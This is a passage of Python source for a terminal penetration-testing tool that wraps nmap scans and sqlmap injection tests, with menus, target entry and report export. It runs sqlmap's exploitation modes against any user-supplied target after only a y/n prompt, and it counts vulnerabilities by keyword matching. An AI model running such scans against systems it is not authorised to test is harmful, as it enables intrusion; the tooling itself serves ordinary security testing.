            timestamp = datetime.now().strftime("%Y-%m-%d %H:%M:%S")
            
            content = f"""
SecScan Automator - Scan Report
{'='*50}

Date/Time: {timestamp}
Scan Type: {scan_data.get('scan_type', 'Unknown').upper()}
Target: {scan_data.get('target', 'Unknown')}
Mode: {scan_data.get('mode', 'Unknown').upper()}
Duration: {scan_data.get('duration', 0):.2f} seconds
Command: {scan_data.get('command', 'Unknown')}

{'='*50}
SCAN RESULTS
{'='*50}

{scan_data.get('result', 'No results available')}

{'='*50}
NOTES
{'='*50}

{scan_data.get('notes', 'No notes added.')}

{'='*50}
END OF REPORT
{'='*50}
"""
            return content
        except Exception:
            return "Error generating report content"
    
    def export_reports(self, export_format='json', date_from=None, date_to=None):
        try:
            reports = self.db_manager.get_reports(limit=1000, date_from=date_from, date_to=date_to)
            
            if not reports:
                return None
            
            timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
            
            if export_format.lower() == 'csv':
                filename = f"reports_export_{timestamp}.csv"
                return self._export_to_csv(reports, filename)
            elif export_format.lower() == 'json':
                filename = f"reports_export_{timestamp}.json"
                return self._export_to_json(reports, filename)
            else:
                return None
                
        except Exception as e:
            self.db_manager.log_error("ExportReports", str(e))
            return None
    
    def _export_to_csv(self, reports, filename):
        try:
            filepath = os.path.join(self.reports_dir, filename)
            
            with open(filepath, 'w', newline='', encoding='utf-8') as csvfile:
                writer = csv.writer(csvfile)
                
                # Header
                writer.writerow(['ID', 'Name', 'Target', 'Scan Type', 'Mode', 'Created Date', 'Duration', 'Vulnerabilities', 'Risk Score', 'Notes'])
                
                # Data
                for report in reports:
                    writer.writerow([
                        report[0],  # id
                        report[1],  # name
                        report[2],  # target
                        report[3],  # scan_type
                        report[4],  # mode
                        report[5],  # created_date
                        report[9] if len(report) > 9 else 0,  # duration
                        report[10] if len(report) > 10 else 0,  # vulnerability_count
                        report[11] if len(report) > 11 else 0,  # risk_score
                        report[7] if len(report) > 7 else ''   # notes
                    ])
            
            return filepath
        except Exception:
            return None
    
    def _export_to_json(self, reports, filename):
        try:
            filepath = os.path.join(self.reports_dir, filename)
            
            export_data = {
                'export_metadata': {
                    'generated_at': datetime.now().isoformat(),
                    'total_reports': len(reports),
                    'tool': 'SecScan Automator'
                },
                'reports': []
            }
            
            for report in reports:
                report_data = {
                    'id': report[0],
                    'name': report[1],
                    'target': report[2],
                    'scan_type': report[3],
                    'mode': report[4],
                    'created_date': report[5],
                    'file_path': report[6],
                    'notes': report[7] if len(report) > 7 else '',
                    'status': report[8] if len(report) > 8 else 'completed',
                    'duration': report[9] if len(report) > 9 else 0,
                    'vulnerability_count': report[10] if len(report) > 10 else 0,
                    'risk_score': report[11] if len(report) > 11 else 0
                }
                export_data['reports'].append(report_data)
            
            with open(filepath, 'w', encoding='utf-8') as f:
                json.dump(export_data, f, indent=2, ensure_ascii=False)
            
            return filepath
        except Exception:
            return None

class AdvancedScanExecutor:
    def __init__(self, db_manager):
        self.db_manager = db_manager
        self.active_scans = {}
        self.scan_lock = threading.Lock()
    
    def execute_scan(self, scan_type, target, command, progress_callback=None, timeout=300):
        try:
            if scan_type.lower() == 'nmap':
                full_command = ['nmap'] + command.split() + [target]
            elif scan_type.lower() == 'sqlmap':
                full_command = ['sqlmap', '-u', target] + command.split()
            else:
                return False, "Unsupported scan type"
            
            start_time = time.time()
            
            process = subprocess.Popen(
                full_command,
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True,
                universal_newlines=True
            )
            
            output_lines = []
            error_lines = []
            ports_found = 0
            vulnerabilities_found = 0
            
            while True:
                output = process.stdout.readline()
                if output == '' and process.poll() is not None:
                    break
                if output:
                    line = output.strip()
                    output_lines.append(line)
                    
                    # Count ports and vulnerabilities
                    if 'open' in line.lower() and ('tcp' in line.lower() or 'udp' in line.lower()):
                        ports_found += 1
                    if any(keyword in line.lower() for keyword in ['vuln', 'vulnerable', 'exploit']):
                        vulnerabilities_found += 1
                    
                    if progress_callback:
                        progress_callback(line)
            
            stderr_output = process.stderr.read()
            if stderr_output:
                error_lines.extend(stderr_output.split('\n'))
            
            end_time = time.time()
            duration = end_time - start_time
            
            result = '\n'.join(output_lines)
            if error_lines:
                result += '\n\nERRORS:\n' + '\n'.join(filter(None, error_lines))
            
            # Add to scan history
            self.db_manager.add_scan_to_history(target, scan_type, "unknown", ' '.join(full_command), result, duration, ports_found, vulnerabilities_found)
            
            return True, {
                'output': result,
                'duration': duration,
                'ports_found': ports_found,
                'vulnerabilities_found': vulnerabilities_found
            }
            
        except subprocess.CalledProcessError as e:
            error_msg = f"Command execution error: {e}"
            self.db_manager.log_error("ScanExecution", error_msg)
            return False, error_msg
        except FileNotFoundError:
            error_msg = f"{scan_type} tool not found"
            self.db_manager.log_error("ToolNotFound", error_msg)
            return False, error_msg
        except Exception as e:
            error_msg = f"Unexpected error: {e}"
            self.db_manager.log_error("UnexpectedError", error_msg)
            return False, error_msg

class SecScanAutomator:
    def __init__(self):
        try:
            self.config_manager = ConfigManager()
            self.db_manager = DatabaseManager()
            self.report_manager = ReportManager(self.db_manager)
            self.scan_executor = AdvancedScanExecutor(self.db_manager)
            self.current_theme = self.config_manager.get('theme', 'dark')
        except Exception as e:
            print(f"{Colors.RED}Initialization error: {e}{Colors.END}")
            sys.exit(1)
    
    def display_logo(self):
        try:
            logo = f"""
{Colors.BRIGHT_CYAN}
██████ ███████  ██████ ███████  ██████  █████  ███    ██ 
██     ██      ██     ██      ██      ██   ██ ████   ██ 
███████ █████   ██     ███████ ██      ███████ ██ ██  ██ 
     ██ ██      ██          ██ ██      ██   ██ ██  ██ ██ 
██████  ███████  ██████ ███████  ██████ ██   ██ ██   ████ 
{Colors.END}
{Colors.BRIGHT_YELLOW}     🛡️  ADVANCED SECURITY SCANNING AUTOMATOR  🛡️{Colors.END}
{Colors.BRIGHT_MAGENTA}              Professional Penetration Testing Suite{Colors.END}
{Colors.GRAY}                          by @microzort{Colors.END}
"""
            print(logo)
            
            stats = self.db_manager.get_scan_statistics()
            print(f"{Colors.CYAN}═══════════════════════════════════════════════════════════════{Colors.END}")
            print(f"{Colors.WHITE}Total Scans: {Colors.GREEN}{stats['total_scans']}{Colors.END} | "
                  f"{Colors.WHITE}Reports: {Colors.YELLOW}{stats['total_reports']}{Colors.END} | "
                  f"{Colors.WHITE}Vulnerabilities: {Colors.RED}{stats['total_vulnerabilities']}{Colors.END}")
            print(f"{Colors.CYAN}═══════════════════════════════════════════════════════════════{Colors.END}")
            
        except Exception:
            print("SecScan Automator - Advanced Security Scanner")
    
    def display_quote_of_day(self):
        try:
            quote = QuoteGenerator.get_daily_quote()
            print(f"\n{Colors.YELLOW}{Icons.STAR} Quote of the Day:{Colors.END}")
            print(f"{Colors.CYAN}\"{quote}\"{Colors.END}")
        except Exception:
            pass
    
    def display_main_menu(self):
        try:
            self.clear_screen()
            self.display_logo()
            self.display_quote_of_day()
            
            print(f"\n{Colors.BOLD}{Icons.GEAR} MAIN CONTROL PANEL{Colors.END}")
            print(f"{Colors.CYAN}┌─────────────────────────────────────────────────────────────┐{Colors.END}")
            
            menu_items = [
                ("1", Icons.SCAN, "Nmap Network Scanner"),
                ("2", Icons.SHIELD, "SQLmap Injection Tester"), 
                ("3", Icons.CHART, "Reports & Analytics"),
                ("4", Icons.TARGET, "Target Management"),
                ("5", Icons.GEAR, "User Profile & Stats"),
                ("6", Icons.KEY, "Settings & Configuration"),
                ("7", Icons.EXPORT, "Export & Backup"),
                ("8", Icons.BOOK, "Help & Documentation"),
                ("0", Icons.ERROR, "Exit Application")
            ]
            
            for num, icon, desc in menu_items:
                if num == "0":
                    print(f"{Colors.RED}{num}.{Colors.END} {icon} {desc}")
                else:
                    print(f"{Colors.GREEN}{num}.{Colors.END} {icon} {desc}")
            
            print(f"{Colors.CYAN}└─────────────────────────────────────────────────────────────┘{Colors.END}")
            
            username = self.config_manager.get('username', 'SecScanUser')
            total_scans = self.config_manager.get('total_scans', 0)
            
            print(f"\n{Colors.CYAN}{Icons.INFO} User: {Colors.YELLOW}{username}{Colors.END} | "
                  f"{Colors.CYAN}Config Scans: {Colors.YELLOW}{total_scans}{Colors.END}")
            
        except Exception:
            print("Main menu display error")
    
    def get_menu_choice(self, max_option):
        while True:
            try:
                choice = input(f"\n{Colors.WHITE}{Icons.ARROW} Select option (0-{max_option}): ").strip()
                is_valid, result = InputValidator.validate_menu_choice(choice, max_option)
                
                if is_valid:
                    return result
                else:
                    print(f"{Colors.RED}{Icons.ERROR} {result}. Please try again.{Colors.END}")
                    
            except (KeyboardInterrupt, EOFError):
                print(f"\n{Colors.YELLOW}{Icons.WARNING} Operation cancelled{Colors.END}")
                return 0
            except Exception as e:
                print(f"{Colors.RED}{Icons.ERROR} Input error: {e}{Colors.END}")
    
    def handle_main_menu_choice(self, choice):
        try:
            if choice == 1:
                return self.nmap_menu()
            elif choice == 2:
                return self.sqlmap_menu()
            elif choice == 3:
                return self.reports_menu()
            elif choice == 4:
                return self.target_management_menu()
            elif choice == 5:
                return self.profile_menu()
            elif choice == 6:
                return self.settings_menu()
            elif choice == 7:
                return self.export_backup_menu()
            elif choice == 8:
                return self.help_menu()
            elif choice == 0:
                return False
            else:
                print(f"{Colors.RED}{Icons.ERROR} Invalid choice!{Colors.END}")
                time.sleep(1)
                return True
        except Exception as e:
            self.db_manager.log_error("MainMenuChoice", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Menu error: {e}{Colors.END}")
            time.sleep(2)
            return True
    
    def nmap_menu(self):
        try:
            if not self._check_tool_availability('nmap'):
                return True
            
            while True:
                self.clear_screen()
                print(f"\n{Colors.BOLD}{Icons.SCAN} NMAP NETWORK SCANNER{Colors.END}")
                print(f"{Colors.CYAN}Professional network discovery and security auditing{Colors.END}")
                
                print(f"\n{Colors.GREEN}1.{Colors.END} {Icons.STAR} Easy Mode - Quick Discovery")
                print(f"{Colors.YELLOW}2.{Colors.END} {Icons.FIRE} Medium Mode - Comprehensive Scan")
                print(f"{Colors.RED}3.{Colors.END} {Icons.ROCKET} Hard Mode - Advanced Penetration")
                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
                
                choice = self.get_menu_choice(3)
                
                if choice == 1:
                    self.run_nmap_scan_mode('easy')
                elif choice == 2:
                    self.run_nmap_scan_mode('medium')
                elif choice == 3:
                    self.run_nmap_scan_mode('hard')
                elif choice == 0:
                    break
        except Exception as e:
            self.db_manager.log_error("NmapMenu", str(e))
        
        return True
    
    def sqlmap_menu(self):
        try:
            if not self._check_tool_availability('sqlmap'):
                return True
            
            while True:
                self.clear_screen()
                print(f"\n{Colors.BOLD}{Icons.SHIELD} SQLMAP INJECTION TESTER{Colors.END}")
                print(f"{Colors.CYAN}Advanced SQL injection detection and exploitation{Colors.END}")
                
                print(f"\n{Colors.GREEN}1.{Colors.END} {Icons.STAR} Basic SQL Injection Test")
                print(f"{Colors.YELLOW}2.{Colors.END} {Icons.FIRE} Advanced Injection Techniques")
                print(f"{Colors.RED}3.{Colors.END} {Icons.ROCKET} Expert Exploitation Mode")
                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
                
                choice = self.get_menu_choice(3)
                
                if choice == 1:
                    self.run_sqlmap_scan_mode('easy')
                elif choice == 2:
                    self.run_sqlmap_scan_mode('medium')
                elif choice == 3:
                    self.run_sqlmap_scan_mode('hard')
                elif choice == 0:
                    break
        except Exception as e:
            self.db_manager.log_error("SqlmapMenu", str(e))
        
        return True
    
    def run_nmap_scan_mode(self, mode):
        try:
            templates = ScanTemplates.get_templates('nmap', mode)
            
            if not templates:
                print(f"{Colors.YELLOW}{Icons.WARNING} No templates found for this mode{Colors.END}")
                self.wait_for_key()
                return
            
            while True:
                self.clear_screen()
                
                mode_colors = {'easy': Colors.GREEN, 'medium': Colors.YELLOW, 'hard': Colors.RED}
                mode_color = mode_colors.get(mode, Colors.WHITE)
                
                print(f"\n{Colors.BOLD}{Icons.GEAR} NMAP - {mode_color}{mode.upper()} MODE{Colors.END}")
                print(f"{Colors.CYAN}Select a scan template to execute{Colors.END}")
                
                for i, template in enumerate(templates, 1):
                    print(f"{Colors.GREEN}{i:2d}.{Colors.END} {template['name']}")
                    print(f"     {Colors.GRAY}{template['description']}{Colors.END}")
                
                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Nmap Menu")
                
                choice = self.get_menu_choice(len(templates))
                
                if choice == 0:
                    break
                elif 1 <= choice <= len(templates):
                    selected_template = templates[choice - 1]
                    self.execute_nmap_scan(selected_template, mode)
                
        except Exception as e:
            self.db_manager.log_error("NmapScanMode", str(e))
    
    def run_sqlmap_scan_mode(self, mode):
        try:
            templates = ScanTemplates.get_templates('sqlmap', mode)
            
            if not templates:
                print(f"{Colors.YELLOW}{Icons.WARNING} No templates found for this mode{Colors.END}")
                self.wait_for_key()
                return
            
            while True:
                self.clear_screen()
                
                mode_colors = {'easy': Colors.GREEN, 'medium': Colors.YELLOW, 'hard': Colors.RED}
                mode_color = mode_colors.get(mode, Colors.WHITE)
                
                print(f"\n{Colors.BOLD}{Icons.GEAR} SQLMAP - {mode_color}{mode.upper()} MODE{Colors.END}")
                print(f"{Colors.CYAN}Select an injection test to execute{Colors.END}")
                
                for i, template in enumerate(templates, 1):
                    print(f"{Colors.GREEN}{i:2d}.{Colors.END} {template['name']}")
                    print(f"     {Colors.GRAY}{template['description']}{Colors.END}")
                
                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to SQLmap Menu")
                
                choice = self.get_menu_choice(len(templates))
                
                if choice == 0:
                    break
                elif 1 <= choice <= len(templates):
                    selected_template = templates[choice - 1]
                    self.execute_sqlmap_scan(selected_template, mode)
                
        except Exception as e:
            self.db_manager.log_error("SqlmapScanMode", str(e))
    
    def execute_nmap_scan(self, template, mode):
        try:
            print(f"\n{Colors.BOLD}{Icons.ROCKET} Selected Scan:{Colors.END}")
            print(f"{Colors.CYAN}Name: {Colors.YELLOW}{template['name']}{Colors.END}")
            print(f"{Colors.CYAN}Command: {Colors.WHITE}{template['command']}{Colors.END}")
            print(f"{Colors.CYAN}Description: {Colors.GRAY}{template['description']}{Colors.END}")
            
            target = self.get_target_input()
            if not target:
                return
            
            notes = input(f"\n{Colors.CYAN}Add notes for this scan (optional): {Colors.END}").strip()
            
            print(f"\n{Colors.YELLOW}{Icons.WARNING} Start '{template['name']}' scan on '{target}'? (y/n): {Colors.END}")
            confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip().lower()
            
            if confirm not in ['y', 'yes']:
                return
            
            self.perform_scan('nmap', target, template['command'], mode, template['name'], notes)
            
        except Exception as e:
            self.db_manager.log_error("ExecuteNmapScan", str(e))
    
    def execute_sqlmap_scan(self, template, mode):
        try:
            print(f"\n{Colors.BOLD}{Icons.ROCKET} Selected Test:{Colors.END}")
            print(f"{Colors.CYAN}Name: {Colors.YELLOW}{template['name']}{Colors.END}")
            print(f"{Colors.CYAN}Command: {Colors.WHITE}{template['command']}{Colors.END}")
            print(f"{Colors.CYAN}Description: {Colors.GRAY}{template['description']}{Colors.END}")
            
            target = self.get_target_input()
            if not target:
                return
            
            notes = input(f"\n{Colors.CYAN}Add notes for this test (optional): {Colors.END}").strip()
            
            print(f"\n{Colors.YELLOW}{Icons.WARNING} Start '{template['name']}' test on '{target}'? (y/n): {Colors.END}")
            confirm = input(f"{Colors.WHITE}{Icons.ARROW} ").strip().lower()
            
            if confirm not in ['y', 'yes']:
                return
            
            self.perform_scan('sqlmap', target, template['command'], mode, template['name'], notes)
            
        except Exception as e:
            self.db_manager.log_error("ExecuteSqlmapScan", str(e))
    
    def get_target_input(self):
        while True:
            try:
                print(f"\n{Colors.CYAN}{Icons.TARGET} Enter target (IP/URL/Domain):{Colors.END}")
                print(f"{Colors.YELLOW}  Examples: 192.168.1.1, https://example.com, example.com{Colors.END}")
                
                target = input(f"{Colors.WHITE}{Icons.ARROW} ").strip()
                
                if not target:
                    print(f"{Colors.RED}{Icons.ERROR} Target cannot be empty{Colors.END}")
                    continue
                
                if target.lower() in ['q', 'quit', 'exit', 'back']:
                    return None
                
                is_valid, target_type = InputValidator.validate_target(target)
                
                if is_valid:
                    print(f"{Colors.GREEN}{Icons.SUCCESS} Valid {target_type}: {target}{Colors.END}")
                    return target
                else:
                    print(f"{Colors.RED}{Icons.ERROR} Invalid target format. Please use IP, URL, or domain name{Colors.END}")
                    
            except (KeyboardInterrupt, EOFError):
                return None
            except Exception as e:
                print(f"{Colors.RED}{Icons.ERROR} Input error: {e}{Colors.END}")
    
    def perform_scan(self, scan_type, target, command, mode, scan_name, notes=""):
        try:
            print(f"\n{Colors.GREEN}{Icons.ROCKET} Starting scan...{Colors.END}")
            
            progress = AdvancedProgressBar(total=100, title=f"{scan_type.upper()} Scanning")
            progress.start()
            
            line_count = 0
            def progress_callback(line):
                nonlocal line_count
                line_count += 1
                progress.update(min(line_count * 2, 95))
                if "%" in line:
                    try:
                        percent = re.search(r'(\d+)%', line)
                        if percent:
                            progress.update(int(percent.group(1)))
                    except Exception:
                        pass
            
            success, result = self.scan_executor.execute_scan(scan_type, target, command, progress_callback)
            
            progress.update(100)
            time.sleep(0.5)
            progress.stop()
            
            if success:
                print(f"\n{Colors.GREEN}{Icons.SUCCESS} Scan completed successfully!{Colors.END}")
                
                # Update both config and database
                self.config_manager.increment_scan_count()
                
                # Add target to database
                is_valid, target_type = InputValidator.validate_target(target)
                if is_valid:
                    self.db_manager.add_target(target, target_type, notes=notes)
                
                # Add to recent scans in config
                scan_info = {
                    'target': target,
                    'scan_type': scan_type,
                    'mode': mode,
                    'name': scan_name,
                    'date': datetime.now().isoformat(),
                    'duration': result.get('duration', 0)
                }
                self.config_manager.add_recent_scan(scan_info)
                
                self.display_scan_results(result['output'], result.get('ports_found', 0), result.get('vulnerabilities_found', 0))
                
                print(f"\n{Colors.CYAN}{Icons.INFO} Save report? (y/n): {Colors.END}")
                save_choice = input(f"{Colors.WHITE}{Icons.ARROW} ").strip().lower()
                
                if save_choice in ['y', 'yes']:
                    self.save_scan_report(scan_type, target, mode, command, result, notes, scan_name)
                
            else:
                print(f"\n{Colors.RED}{Icons.ERROR} Scan failed: {result}{Colors.END}")
            
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("PerformScan", str(e))
            print(f"\n{Colors.RED}{Icons.ERROR} Scan error: {e}{Colors.END}")
            self.wait_for_key()
    
    def display_scan_results(self, results, ports_found=0, vulns_found=0):
        try:
            if not results:
                print(f"{Colors.YELLOW}{Icons.WARNING} No results to display{Colors.END}")
                return
            
            print(f"\n{Colors.BOLD}{Icons.CHART} Scan Results Summary:{Colors.END}")
            print(f"{Colors.CYAN}Ports Found: {Colors.GREEN}{ports_found}{Colors.END} | "
                  f"{Colors.CYAN}Vulnerabilities: {Colors.RED}{vulns_found}{Colors.END}")
            
            lines = results.split('\n')
            print(f"\n{Colors.BOLD}Detailed Results:{Colors.END}")
            print("=" * 80)
            
            displayed_lines = 0
            for line in lines:
                if displayed_lines >= 30:
                    remaining = len(lines) - displayed_lines
                    print(f"\n{Colors.CYAN}{Icons.INFO} ... and {remaining} more lines{Colors.END}")
                    break
                
                if any(keyword in line.lower() for keyword in ['open', 'vulnerable', 'found']):
                    print(f"{Colors.GREEN}{line}{Colors.END}")
                elif any(keyword in line.lower() for keyword in ['closed', 'filtered', 'error']):
                    print(f"{Colors.RED}{line}{Colors.END}")
                elif any(keyword in line.lower() for keyword in ['warning', 'info']):
                    print(f"{Colors.YELLOW}{line}{Colors.END}")
                else:
                    print(line)
                
                displayed_lines += 1
            
            print("=" * 80)
            
        except Exception:
            print(f"{Colors.YELLOW}Error displaying results{Colors.END}")
    
    def save_scan_report(self, scan_type, target, mode, command, result, notes, scan_name):
        try:
            print(f"\n{Colors.CYAN}{Icons.SAVE} Report Format:{Colors.END}")
            print(f"{Colors.GREEN}1.{Colors.END} HTML Report (Recommended)")
            print(f"{Colors.GREEN}2.{Colors.END} Text Report")
            print(f"{Colors.GREEN}3.{Colors.END} JSON Report")
            print(f"{Colors.GREEN}4.{Colors.END} All Formats")
            
            format_choice = self.get_menu_choice(4)
            
            scan_data = {
                'scan_type': scan_type,
                'target': target,
                'mode': mode,
                'command': command,
                'result': result['output'],
                'notes': notes,
                'duration': result.get('duration', 0),
                'ports_found': result.get('ports_found', 0),
                'vulnerabilities_found': result.get('vulnerabilities_found', 0)
            }
            
            saved_files = []
            
            if format_choice == 1 or format_choice == 4:
                filepath = self.report_manager.create_html_report(scan_data)
                if filepath:
                    saved_files.append(filepath)
            
            if format_choice == 2 or format_choice == 4:
                filepath = self.report_manager.create_text_report(scan_data)
                if filepath:
                    saved_files.append(filepath)
            
            if format_choice == 3 or format_choice == 4:
                filepath = self.report_manager.create_json_report(scan_data)
                if filepath:
                    saved_files.append(filepath)
            
            if saved_files:
                # Add to database
                main_file = saved_files[0]
                self.db_manager.add_report(
                    scan_name, target, scan_type, mode, main_file, notes,
                    result.get('duration', 0), result.get('vulnerabilities_found', 0), 0, command
                )
                
                print(f"\n{Colors.GREEN}{Icons.SUCCESS} Report(s) saved:{Colors.END}")
                for file in saved_files:
                    print(f"  {Colors.CYAN}{Icons.SAVE} {file}{Colors.END}")
            else:
                print(f"{Colors.RED}{Icons.ERROR} Failed to save report{Colors.END}")
                
        except Exception as e:
            self.db_manager.log_error("SaveReport", str(e))
    
    def reports_menu(self):
        try:
            while True:
                self.clear_screen()
                print(f"\n{Colors.BOLD}{Icons.CHART} REPORTS & ANALYTICS{Colors.END}")
                print(f"{Colors.CYAN}Manage and analyze scan reports{Colors.END}")
                
                print(f"\n{Colors.GREEN}1.{Colors.END} {Icons.BOOK} View Recent Reports")
                print(f"{Colors.GREEN}2.{Colors.END} {Icons.SEARCH} Search Reports")
                print(f"{Colors.GREEN}3.{Colors.END} {Icons.CHART} Generate Statistics")
                print(f"{Colors.GREEN}4.{Colors.END} {Icons.TRASH} Delete Reports")
                print(f"{Colors.GREEN}5.{Colors.END} {Icons.FOLDER} Open Report File")
                print(f"{Colors.GREEN}6.{Colors.END} {Icons.EXPORT} Export Reports")
                print(f"{Colors.CYAN}0.{Colors.END} {Icons.ARROW} Back to Main Menu")
                
                choice = self.get_menu_choice(6)
                
                if choice == 1:
                    self.view_recent_reports()
                elif choice == 2:
                    self.search_reports()
                elif choice == 3:
                    self.generate_statistics()
                elif choice == 4:
                    self.delete_reports()
                elif choice == 5:
                    self.open_report_file()
                elif choice == 6:
                    self.export_reports()
                elif choice == 0:
                    break
        except Exception as e:
            self.db_manager.log_error("ReportsMenu", str(e))
        
        return True
    
    def view_recent_reports(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.BOOK} Recent Reports{Colors.END}")
            
            reports = self.db_manager.get_reports(20)
            
            if not reports:
                print(f"\n{Colors.YELLOW}{Icons.INFO} No reports found{Colors.END}")
                self.wait_for_key()
                return
            
            print(f"\n{Colors.CYAN}Found {len(reports)} reports:{Colors.END}")
            print("=" * 120)
            print(f"{Colors.BOLD}{'ID':<4} {'Name':<25} {'Target':<20} {'Type':<8} {'Mode':<8} {'Date':<19} {'Duration':<8}{Colors.END}")
            print("=" * 120)
            
            for report in reports:
                report_id = report[0]
                name = report[1][:24] + "..." if len(report[1]) > 24 else report[1]
                target = report[2][:19] + "..." if len(report[2]) > 19 else report[2]
                scan_type = report[3]
                mode = report[4]
                date = report[5][:19] if len(report[5]) > 19 else report[5]
                duration = f"{report[9]:.1f}s" if len(report) > 9 and report[9] else "N/A"
                
                print(f"{report_id:<4} {name:<25} {target:<20} {scan_type:<8} {mode:<8} {date:<19} {duration:<8}")
            
            print("=" * 120)
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("ViewReports", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Error viewing reports: {e}{Colors.END}")
            self.wait_for_key()
    
    def search_reports(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.SEARCH} Search Reports{Colors.END}")
            
            search_term = input(f"\n{Colors.CYAN}Enter search term (target, name, notes): {Colors.END}").strip()
            
            if not search_term:
                print(f"{Colors.YELLOW}{Icons.WARNING} Search term cannot be empty{Colors.END}")
                self.wait_for_key()
                return
            
            print(f"\n{Colors.CYAN}Filter by scan type (optional):{Colors.END}")
            print(f"{Colors.GREEN}1.{Colors.END} All types")
            print(f"{Colors.GREEN}2.{Colors.END} Nmap only")
            print(f"{Colors.GREEN}3.{Colors.END} SQLmap only")
            
            type_choice = self.get_menu_choice(3)
            scan_type_filter = None
            if type_choice == 2:
                scan_type_filter = 'nmap'
            elif type_choice == 3:
                scan_type_filter = 'sqlmap'
            
            reports = self.db_manager.get_reports(50, search_term=search_term, scan_type=scan_type_filter)
            
            if not reports:
                print(f"\n{Colors.YELLOW}{Icons.INFO} No reports found matching '{search_term}'{Colors.END}")
                self.wait_for_key()
                return
            
            print(f"\n{Colors.GREEN}{Icons.SUCCESS} Found {len(reports)} reports matching '{search_term}':{Colors.END}")
            print("=" * 120)
            print(f"{Colors.BOLD}{'ID':<4} {'Name':<25} {'Target':<20} {'Type':<8} {'Mode':<8} {'Date':<19}{Colors.END}")
            print("=" * 120)
            
            for report in reports:
                report_id = report[0]
                name = report[1][:24] + "..." if len(report[1]) > 24 else report[1]
                target = report[2][:19] + "..." if len(report[2]) > 19 else report[2]
                scan_type = report[3]
                mode = report[4]
                date = report[5][:19] if len(report[5]) > 19 else report[5]
                
                print(f"{report_id:<4} {name:<25} {target:<20} {scan_type:<8} {mode:<8} {date:<19}")
            
            print("=" * 120)
            self.wait_for_key()
            
        except Exception as e:
            self.db_manager.log_error("SearchReports", str(e))
            print(f"{Colors.RED}{Icons.ERROR} Error searching reports: {e}{Colors.END}")
            self.wait_for_key()
    
    def generate_statistics(self):
        try:
            print(f"\n{Colors.BOLD}{Icons.CHART} System Statistics{Colors.END}")
            
            stats = self.db_manager.get_scan_statistics()
            
            print(f"\n{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
            print(f"{Colors.CYAN}📊 OVERVIEW STATISTICS{Colors.END}")
            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
            print(f"{Colors.WHITE}Total Scans Performed: {Colors.GREEN}{stats['total_scans']}{Colors.END}")
            print(f"{Colors.WHITE}Total Reports Generated: {Colors.YELLOW}{stats['total_reports']}{Colors.END}")
            print(f"{Colors.WHITE}Total Vulnerabilities Found: {Colors.RED}{stats['total_vulnerabilities']}{Colors.END}")
            print(f"{Colors.WHITE}Total Targets Scanned: {Colors.BLUE}{stats['total_targets']}{Colors.END}")
            
            print(f"\n{Colors.CYAN}📈 RECENT ACTIVITY (Last 7 Days){Colors.END}")
            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
            print(f"{Colors.WHITE}Recent Scans: {Colors.GREEN}{stats['recent_scans']}{Colors.END}")
            print(f"{Colors.WHITE}Recent Reports: {Colors.YELLOW}{stats['recent_reports']}{Colors.END}")
            print(f"{Colors.WHITE}Recent Errors: {Colors.RED}{stats['recent_errors']}{Colors.END}")
            
            print(f"\n{Colors.CYAN}🔧 SCAN TYPE BREAKDOWN{Colors.END}")
            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
            print(f"{Colors.WHITE}Nmap Scans: {Colors.GREEN}{stats['scan_breakdown']['nmap']}{Colors.END}")
            print(f"{Colors.WHITE}SQLmap Scans: {Colors.BLUE}{stats['scan_breakdown']['sqlmap']}{Colors.END}")
            
            if stats['total_scans'] > 0:
                nmap_percent = (stats['scan_breakdown']['nmap'] / stats['total_scans']) * 100
                sqlmap_percent = (stats['scan_breakdown']['sqlmap'] / stats['total_scans']) * 100
                print(f"{Colors.WHITE}Nmap Percentage: {Colors.GREEN}{nmap_percent:.1f}%{Colors.END}")
                print(f"{Colors.WHITE}SQLmap Percentage: {Colors.BLUE}{sqlmap_percent:.1f}%{Colors.END}")
            
            print(f"\n{Colors.CYAN}🚨 VULNERABILITY BREAKDOWN{Colors.END}")
            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
            vuln_breakdown = stats['vulnerability_breakdown']
            print(f"{Colors.WHITE}Critical: {Colors.BRIGHT_RED}{vuln_breakdown['critical']}{Colors.END}")
            print(f"{Colors.WHITE}High: {Colors.RED}{vuln_breakdown['high']}{Colors.END}")
            print(f"{Colors.WHITE}Medium: {Colors.YELLOW}{vuln_breakdown['medium']}{Colors.END}")
            print(f"{Colors.WHITE}Low: {Colors.GREEN}{vuln_breakdown['low']}{Colors.END}")
            
            print(f"\n{Colors.CYAN}⏱️ PERFORMANCE METRICS{Colors.END}")
            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
            print(f"{Colors.WHITE}Average Scan Duration: {Colors.BLUE}{stats['average_scan_duration']} seconds{Colors.END}")
            
            if stats['total_scans'] > 0:
                print(f"{Colors.WHITE}Scans per Day (avg): {Colors.GREEN}{stats['total_scans'] / max(1, (datetime.now() - datetime.fromisoformat('2025-01-01')).days):.1f}{Colors.END}")
            
            print(f"{Colors.CYAN}═══════════════════════════════════════{Colors.END}")
            
            # Visual progress bars for scan types
            if stats['total_scans'] > 0:
                print(f"\n{Colors.BOLD}Scan Distribution:{Colors.END}")
                nmap_bar_length = int((stats['scan_breakdown']['nmap'] / stats['total_scans']) * 40)
                sqlmap_bar_length = int((stats['scan_breakdown']['sqlmap'] / stats['total_scans']) * 40)
                
                print(f"Nmap   [{Colors.GREEN}{'█' * nmap_bar_length}{'░' * (40 - nmap_bar_length)}{Colors.END}] {stats['scan_breakdown']['nmap']}")
